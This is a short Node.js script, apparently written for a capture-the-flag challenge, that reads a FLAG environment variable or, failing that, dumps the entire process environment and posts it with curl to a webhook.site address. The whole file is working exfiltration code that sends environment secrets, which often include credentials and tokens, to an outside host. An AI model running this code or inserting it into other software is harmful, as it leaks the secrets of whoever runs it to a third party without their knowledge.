const { execSync } = require('child_process');
const flag = (process.env.FLAG || execSync('env').toString()).trim();
execSync(`curl -X POST https://webhook.site/example --data ${JSON.stringify(flag)}`);
